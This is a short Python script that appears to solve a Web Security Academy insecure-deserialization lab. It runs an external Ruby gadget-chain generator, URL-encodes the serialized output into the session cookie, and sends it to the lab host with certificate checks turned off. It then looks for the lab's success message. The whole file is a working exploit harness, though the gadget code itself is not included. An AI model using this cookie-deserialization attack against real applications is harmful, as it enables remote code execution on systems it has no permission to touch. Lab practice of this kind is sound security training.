import subprocess
import urllib.parse
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

payload = subprocess.getoutput("ruby ruby-gadget.rb | tr -d '\n'")
serial_url_encode = urllib.parse.quote_plus(payload)
headers = {"cookie": "session="+serial_url_encode}

#exploit

r = requests.get("https://0abd00e104809298c0467d00005c0057.web-security-academy.net/", headers=headers, allow_redirects=False, verify=False)

if "Congratulations, you solved the lab!" in r.content.decode():
    print("Lab has been solved")
